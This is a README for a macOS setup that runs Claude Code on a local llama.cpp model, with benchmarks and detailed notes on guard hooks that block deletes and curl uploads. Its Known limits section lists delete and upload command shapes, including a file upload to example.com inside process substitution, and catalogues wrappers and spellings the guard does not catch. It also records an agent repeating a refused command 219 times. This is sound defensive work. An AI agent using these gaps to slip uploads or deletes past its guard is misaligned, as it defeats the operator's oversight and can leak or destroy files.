# local-inference-studio-mac

Claude Code run against a local model on an Apple silicon MacBook: llama.cpp
`llama-server` from Homebrew serves the Anthropic Messages API (`/v1/messages`) on
127.0.0.1, and `scripts/claude-local.sh` points the Claude Code CLI at it. No Ollama, no
LM Studio, no proxy, no cloud model.

This is a macOS port of the Windows repo `local-inference-studio` (RTX 4070 Ti SUPER,
PowerShell), called "the reference" below. Only the server, launcher, guard hooks, smoke
test and bench were ported; the reference's container, web tools, logon task and task
profiles were not. Setup from scratch: [docs/SETUP.md](docs/SETUP.md).

## Verified on (2026-11-14)

| Component | Value |
|---|---|
| Machine | MacBook Air, Apple M4 (10 cores), 32 GB unified memory |
| OS | macOS 26.5.2 |
| Server | llama-server 1.0.0 (build 12359, commit b1b770d90), Homebrew `llama.cpp` |
| Python | 3.13.18, Homebrew `python@3.13` (`/opt/homebrew/bin/python3.13`) |
| Client | Claude Code 2.1.325 |

Anything not run on this machine is marked UNVERIFIED.

```
Claude Code CLI   scripts/claude-local.sh: lean tool set, no MCP, guard hooks,
   |              user settings off, one-model policy appended
   | ANTHROPIC_BASE_URL=http://127.0.0.1:8080, every model alias = "local"
   v
llama-server      scripts/serve.sh: 127.0.0.1 only, fresh API key per start,
   |              --offline, allow-listed extra flags
   v
GGUF model        models/<dir>/<file>.gguf, size and sha256 pinned in models/manifest.json
```

## Quick start

From the repo root, with a model already downloaded and listed (docs/SETUP.md):

```bash
scripts/serve.sh --dry-run            # print the llama-server command line; starts nothing
scripts/serve.sh --detach --wait 300  # start in the background; returns once /health is 200
scripts/smoke.sh                      # health, text, tool_use, tool_result round trip
(cd <project> && <repo>/scripts/claude-local.sh)  # Claude Code on the local server
scripts/stop.sh                       # stop the server recorded in logs/llama-server.pid
```

- `serve.sh` without `--detach` runs llama-server in the foreground; Ctrl-C stops it.
- `smoke.sh` ends with `PASS: health, text, tool_use and tool_result round trip`.
- `claude-local.sh --start-server` starts the server first when `/health` is not ok.
  `claude-local.sh --print-args` prints the claude arguments and the settings JSON and
  exits without contacting the server or reading the key.
- Claude Code runs in the directory you start it from (the project); the launcher finds
  the server, key and hooks from its own location.
- Before a serve or a bench, check the machine: swap in use (`sysctl vm.swapusage`),
  memory free (`serve.sh` logs `memory free: <N> MiB available` at every start), Low
  Power Mode off (`pmset -g`), other large apps closed.

## Models

Both files are in `models/manifest.json` (repo, revision, file, byte size, sha256).

| `MODEL_ID` | File | Size | KV | Reasoning | Chat template |
|---|---|---|---|---|---|
| `qwen3.6-35b-a3b-heretic-iq3m` (default) | Qwen3.6-35B-A3B uncensored heretic, i1-IQ3_M (MoE) | 15.44 GB | f16, `--swa-full` | auto | `config/chat-templates/qwen3.6-35b-a3b.jinja` (patched) |
| `qwen3.8-27b-orcarouter-iq3xxs` | Qwen3.8-27B OrcaRouter GSQ-RCO IQ3_XXS v2.1 (dense 27B) | 10.38 GB | q4_0 | off | `config/chat-templates/qwen3.8-27b.jinja` (the reference's patched template) |

- Use the default for real work: about 7x the decode speed and 7x the prefill speed of
  the 27B on this machine (table below).
- The 27B is the reference's default model. It is kept for like-for-like comparison
  with the Windows numbers, not for daily use here: a 20,000-token prompt takes over nine
  minutes to prefill.
- Claude Code needs a template that accepts a system message after the first one. With
  its GGUF's embedded template the default model failed the first Claude Code turn with
  HTTP 500 "System message must be at the beginning."; the patched template fixed it. The
  27B's own embedded template was never tried here (UNVERIFIED); the reference documents
  the same failure for another Qwen3.8-27B file and ships the patch used here.

## Measured numbers

`bench/run.sh` at context 131072: decode = median of 3 runs of 256 tokens on a 200-token
prompt after one discarded warm-up; prefill = median of 3 cold 20,000-token prompts;
cached = the same prompt again with the prefix cache hit; tools = 20 `/v1/messages`
trials that each need one tool. Logs and JSON are in `bench/results/` (gitignored, kept
on this machine). Both models were benched on 2026-11-14 with a browser open and on AC
power.

| Model, reasoning | Decode tok/s | Prefill 20K | Cached | Tools | Tool p50 | Mem used peak | Server RSS peak |
|---|---|---|---|---|---|---|---|
| default, off | 37.88 | 75.6 s (264.6 tok/s) | 91 ms | 14/20 | 1,127 ms | 27,256 MiB | 18,646 MiB |
| default, auto | 37.49 | 76.1 s (262.7 tok/s) | 79 ms | 19/20 | 6,847 ms | 27,101 MiB | 19,365 MiB |
| 27B, off | 5.39 | 556.5 s (35.9 tok/s) | 412 ms | 20/20 | 6,484 ms | 24,103 MiB | 15,679 MiB |

- Default, reasoning off: the 6 misses answered without calling the tool. With reasoning
  auto the one miss thought for 136 s until it hit max_tokens. Hence `reasoning: auto`
  for this model and `off` for the 27B.
- The default-model benches ran on the GGUF's embedded template, before the patched
  one existed (their `flags` show no `--chat-template-file`). The bench requests hold at
  most one system message, and the commit that added the patch records that 20
  single-system cases render identically under both.
- "Mem used" is wired + active + compressed pages from `vm_stat`; there is no separate
  VRAM figure on unified memory. Whether it measures fit for Metal buffers is UNVERIFIED.
- The reference reports for the 27B on its RTX 4070 Ti SUPER 16 GB: decode 48.6 tok/s,
  20K prefill 11.8 s (1,697 tok/s), tools 20/20 (the reference's `config/models.md`; not
  measured here).
- Decode falls with context depth. From one session's server log (default model,
  reasoning auto, 2026-11-14; not a bench): 37.5 tok/s near empty, 31.9 at 11K tokens,
  21.2 at 28K, 13.9 at 50K, 9.9 at 71K. The bench figure is the top of that curve.

## Switching models

`MODEL_ID` in `config/lis.conf` is the only line to change. Everything that differs by
model lives in its `models/manifest.json` entry and follows `MODEL_ID`:

- `kv_type` (overrides `KV_TYPE`), `sampling` (`temp`, `top_p`, `top_k`; defaults 0.6,
  0.95, 20), `server_args` (extra llama-server flags, allow-listed), `reasoning`
  (`off`/`on`/`auto`; `serve.sh --reasoning ...` overrides it for one start),
  `chat_template` (replaces `CHAT_TEMPLATE`).

```bash
scripts/stop.sh
# edit config/lis.conf: MODEL_ID=qwen3.8-27b-orcarouter-iq3xxs
scripts/serve.sh --dry-run      # check -ctk/-ctv, --reasoning and --chat-template-file
scripts/serve.sh --detach --wait 300
scripts/smoke.sh
```

`config/lis.conf` is parsed, never sourced. `CTX=131072` is the server context;
`CLIENT_CTX=114688` is the window Claude Code is told about (kept below `CTX`). The
first start after each boot hashes the model file and refuses on a size or sha256
mismatch. The field rules and the extra-flag allow-list are in
[models/README.md](models/README.md).

## Layout

| Path | What |
|---|---|
| `scripts/serve.sh` | start llama-server (`--detach`, `--dry-run`, `--wait N`, `--reasoning`, `-- EXTRA_ARGS`) |
| `scripts/stop.sh` | stop the one recorded server pid (SIGTERM, up to 30 s, no escalation) |
| `scripts/smoke.sh` | 4-step smoke test against the running server |
| `scripts/claude-local.sh` | launch Claude Code against the server (see its header for every option) |
| `scripts/hooks/` | guard hooks: `lis-guard.py`, `loop-guard.py`, `repeat-guard.py`, `facts-inject.py` (not registered in this port) |
| `scripts/tests/` | test suites, plus `chat_template_check.py` (needs a running server) |
| `bench/run.sh` | bench the running server; writes JSON and a tee'd log to `bench/results/` |
| `config/lis.conf` | `PORT`, `CTX`, `CLIENT_CTX`, `KV_TYPE`, `MODEL_ID`, `CHAT_TEMPLATE` |
| `config/claude-settings.json` | the `--settings` overlay: model `local`, allow/ask/deny rules |
| `config/chat-templates/` | the two patched templates, each with a header saying what changed |
| `models/manifest.json`, `models/README.md` | the servable files and the per-model fields |
| `logs/` (gitignored) | per-start API key, server logs, pid file, lock, hash marker |

## Tests

Run from the repo root:

```bash
/opt/homebrew/bin/python3.13 scripts/tests/serve_test.py         # about 2 minutes; ends "OK" (78 tests)
/opt/homebrew/bin/python3.13 scripts/tests/stop_test.py          # ends "OK" (20 tests)
/opt/homebrew/bin/python3.13 scripts/tests/claude_local_test.py  # ends "745/745 passed"
```

The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are listed in
[CLAUDE.md](CLAUDE.md). With a server running on the model to check:

```bash
/opt/homebrew/bin/python3.13 -I scripts/tests/chat_template_check.py   # last line "PASS"
```

## Known limits

- A command refused by the guard and repeated by the model is bounded only by a turn
  cap. The first working session sent one refused `python3 -c` command 219 times in a
  row until it was stopped by hand: the guards denied every repeat, but a deny is text
  only and does not end the turn (diagnosis in AGENT_LEARNINGS.md, 2026-11-14). In
  print mode the launcher now adds `--max-turns 60` unless you pass `--max-turns N`
  (1 to 10000); the run then ends with result subtype `error_max_turns` (checked on
  2026-11-14 with `--max-turns 2`; result JSON saved as
  `bench/results/20261114-max-turns-2-live.json`, gitignored like the other logs). Interactive sessions get no cap. A turn cap does not
  bound the time one turn takes (a long generation or a slow command), so still watch a
  headless run's wall time.
- Thinking runaways are not capped: `--reasoning-budget` is not on `serve.sh`'s
  allow-list.
- Print mode (`-p`) cannot answer a permission prompt: a command that needs approval
  comes back "This command requires approval". Pre-approve the test command or run the
  session interactively (pre-approval not yet tried, UNVERIFIED). The guard also refuses inline `python3 -c` and running a file
  written in the same session.
- UNVERIFIED on this client: that the `--settings` file outranks the project's
  `.claude/settings*.json` (the launcher refuses risky project files instead);
  `--permission-mode manual`; compaction with reasoning on.
- The guard carries the reference's W-25 (ported 2026-11-14, checked by
  `lis-guard_test.py`; not yet exercised in a live session, UNVERIFIED there):
  `find <path> ... -delete`, `find ... -exec|-execdir|-ok|-okdir rm {} ;|+`, `git restore`
  and `git checkout [<ref>] -- <paths>` are refused as deletes, BSD find's leading options
  included (`find -E`, `-x`, `-L`, `-f path`). The text scan has bounds: an `rm`
  `-r`/`-f` flag is found when at most 20 words come between `rm` and it (`rm x -rf`,
  `rm -i -rf x`; 21 words before it get no decision); `git checkout` takes at most 3
  words before its `--`; and `find` matches when at most 400 characters come between
  `find ` and the space before `-delete` or `-exec`/`-execdir`/`-ok`/`-okdir` (401 get
  no decision). From the third refused delete of the same paths in one session, the
  reason tells the model to stop and report. One count covers the relative, absolute,
  `./`, trailing-slash and quoted spellings of a path, the `rm`, `find`, `git restore`
  and `git checkout` verbs, and the BSD spellings (`rm -rf x`, `rm -r ./x/ && echo b`,
  `find -E x -delete`, `git restore x`). These count separately, each only as its own
  exact command, though every one still denies each time: `sudo`, `command`, `/bin/rm`,
  `bash -c "..."`, `git -C dir restore`, a symlinked path, a different letter case,
  `$PWD/x`, a glob. Refused although harmless (accepted text-scan false positives):
  `grep -n rm f -r`, `echo "rm x -rf"`, an unquoted `echo rm is not -f safe`,
  `echo "find x -delete"`, `grep -rn "git restore" docs`, `git rm --cached -r x`,
  `git restore --staged a`, `git restore --help`, `git restore -h`, a bare
  `git restore`, and `git checkout main -- ` with nothing but a space after `--`. Still
  no guard decision (the permission mode decides): `git checkout .`,
  `git checkout HEAD a`, `git switch -f`, `unlink`, `shred -u`, `rsync --delete`,
  `xargs rm` without `-r`/`-f`, `find -exec rmdir|unlink`, quoted verb words
  (`'rm' -rf x`, `find . "-delete"`), and shapes past the bounds above. The reference's container-profile part
  of W-25 is in the code but inert here (no `LIS_CONTAINER`).
- The reference's W-19 (curl upload judgement) is ported in both halves, the guard hook
  and the pinned settings (the settings half is the last paragraph of this item). A curl
  upload (`-d`, `-F`, `-T`, `--data*`, `--form*`, `--json`, `--upload-file`) is loopback-only
  when no route option is present (`--url`, `--proxy*`, `-x`, `--preproxy`, `--connect-to`,
  `--resolve`, `--socks*`, `--noproxy`, an `--expand-` form of one; Mac additions from
  curl 8.7.1's `--help all`: `-K`/`--config`, `--alt-svc`, `--doh-url`, `--dns-servers`, and
  a strict prefix of any route name, for a curl that takes abbreviations; this Mac's curl
  8.7.1 does not take them for the options checked: `--jso`, `--upload-fil` and
  `--data-binar` exit 2 with "is unknown", checked offline with `-V` on 2026-11-14) and every target word is a loopback URL or a bare
  `localhost`/`127.0.0.1`/`[::1]`; option values and redirections are skipped, the word
  after `-:` counts, a quoted `<` or `>` word is a target. Words in front of the tool are
  read through, so the upload behind them is judged: assignments, `command`, `env`,
  `exec`, `nohup`, `time`, `nice`, `timeout` with their options, then `busybox`, `sudo` or
  `doas` (the last two a Mac addition, with sudo's options), chained up to 6 levels
  (`env sudo nice curl` is read; after `busybox` the next word must be the tool itself,
  so `busybox env curl` is not). An upload is denied when one of these is assigned
  before curl or wget: an `http_proxy`, `https_proxy`, `all_proxy`, `ftp_proxy` or
  `socks*_proxy` variable, any case (not `no_proxy` or other names such as
  `gopher_proxy`); as Mac additions, a `CURL_HOME`, `XDG_CONFIG_HOME` or `HOME` before
  curl; and a target whose host the shell or a URL glob can still rewrite
  (`http://localhost:$P/`, a `*` or `?` before the first `/`,
  `http://localhost:3000{/,@evil.com}`). The `?` rule also refuses a quoted
  `'http://localhost:3000?q=1'` (an accepted false positive). wget uploads deny on
  `-e`/`--execute` or a non-loopback IPv4, `[IPv6]` or host:port word. Mac addition: a
  `-H`/`--header` value that starts with `@` (curl reads that file and sends its lines as
  headers) is never allowed by the read-only curl rule and counts as an upload, so, like
  `-d @file`, it gets no decision to a loopback host and is denied to any other host
  (`--proxy-header @file` denies as a route option); a header that merely contains `@`
  keeps its allow. Residuals, as in the reference: a proxy set outside the command (the
  environment, `~/.curlrc`, a wgetrc), wget bare single-label words, and bundled forms
  such as `curl -sd`, which the settings rows do not match; also no decision (never allow)
  for `-L`/`--location*`, `--unix-socket`, wget `-i`/`--config`, and the wrappers the hook
  does not read through: `env -S "..."`, `xargs`, `eval`, `builtin`, `stdbuf`,
  `caffeinate`, `arch`, `script`, and `sudo -iu`/`-Eu` (a value letter at the end of a
  bundle). A loopback upload the container profile allows is allowed whatever the
  loopback server does with the body next (a forwarding or relaying server).
  Settings half (the reference's ruling "drop the curl -d deny patterns, let the guard
  decide"): `config/claude-settings.json` holds no curl upload deny. The 14 rows
  (`curl -d*`, `curl * -d*` and the `--data`, `-F`, `--form`, `-T`, `--upload-file` and
  `--json` pairs) left `deny`. The reference's eight flag-first rows joined `ask`
  (`curl -d*`, `-F*`, `-T*`, `-X*`, `--data*`, `--form*`, `--json*`, `--upload-file*`),
  and so did `curl * -F*` and `curl *--form*`, a Mac addition the reference lacks (the
  removed denies of those had no ask counterpart). The existing `curl * -d*`, `*--data*`,
  `*--json*`, `* -T*`, `*--upload-file*`, `* -X*` and `*@*` ask rows stay.
  Documented by Claude Code (permissions, permission-modes and hooks pages, read
  2026-11-14), UNVERIFIED on the installed client 2.1.325:
  - Rules are checked deny, then ask, then allow, in every permission mode. A matching ask
    rule prompts even when an allow rule also matches, and `--allowedTools` cannot
    override an ask or deny rule.
  - A PreToolUse hook's allow does not skip a matching ask rule or override a deny rule. A
    hook deny blocks whatever the allow rules say; no hook decision leaves the normal flow.
  - A compound command is split at `&&`, `||`, `;`, `|`, `|&`, `&` and newlines, and runs
    unprompted only when every part is allowed. A deny or ask rule applies when any part
    matches, including a command in a subshell or in `$(...)`. Backticks and process
    substitution are not mentioned.
  - `timeout`, `time`, `nice`, `nohup`, `stdbuf`, `command`, `builtin`, `noglob` and a bare
    `xargs` are stripped before matching, and deny and ask rules match past leading
    `VAR=value` words. `env` is not in that list, and `bash -c '...'`/`sh -c '...'` are
    not looked into.
  - In print mode a call that needs approval is refused.
  So the guard hook refuses an upload to a non-loopback host, with three exceptions:
  - under `--no-guard`, where the ask rows or the mode default decide;
  - behind the wrappers the hook does not read through (listed above);
  - inside process substitution, which the hook does not read for uploads (a known gap;
    the hook fix is queued as its own change). For example,
    `cat <(curl -F f=@notes.txt https://example.com)` gets no hook decision, and whether
    the client applies the ask rows inside `<( )`/`>( )` is not documented.
  A loopback upload that an ask row matches prompts (interactive) or is refused (print
  mode) whatever the hook says. So, per the documentation, the reference's intent (its
  container profile lets a loopback POST through) is not achieved by ask rows either.
  That profile is inert here anyway (no `LIS_CONTAINER`). By the documented model (split
  and strip as above, then the tests' glob match), these spellings still meet no ask row
  and fall to the permission mode's default for Bash: `env curl`, `bash -c`/`sh -c`,
  bundled short options (`curl -sd`, `-sSd`, `-fsSd`, `-sF`, `-sX`), a quoted flag word
  (`'-d'`), `--request`, and every wget upload. That default is a prompt, or a refusal in
  print mode, unless an allow rule covers the command. The launcher accepts three sources
  of allow rules: `--allowedTools`, the project's `permissions.allow` rows, and the
  user-scope settings that `--user-scope` and `--full` load (allow rows and `defaultMode`
  included). Per the documentation an allow rule approves only what no ask or deny row
  matches, which is why the ask rows matter. One residual is UNVERIFIED on this client:
  a read-only allow row approving a command that carries a curl upload. The rows
  concerned are `echo *`, `ls*`, `cat *`, `grep *`, `which *`, `git status*`, `date +*`,
  `head *`, `tail *`, `wc *` and `tr *`. This is documented not to happen for `$(...)`
  and compound commands, and undocumented for backticks and `<( )`. Every outcome here
  comes from the tests' rule-matching model and a string corpus; none has been observed
  in a live session (UNVERIFIED).
- The guard reads a script or patch file only when it is a regular file. A FIFO, a
  device (`/dev/stdin`, `/dev/tty`), a socket or a directory is never read, so the hook
  cannot block on one: before 2026-11-14 it could (and `lis-guard_test.py` hung when run
  with an open stdin). Not reading it yields no decision from the file's content; rules
  that judge the command text still apply, so `python /dev/stdin` and the other
  code-on-stdin forms are still refused. Whether running an interpreter on a FIFO or
  another device should be refused is an open operator decision.
- One server, one slot (`-np 1`). The launcher warns when the slot is busy
  (`--strict-slot` refuses instead).

## Rules

Agent rules are in [CLAUDE.md](CLAUDE.md). In short: no Ollama or LM Studio; models and
binaries are never committed; scripts never pipe to a shell; the repo is local only.
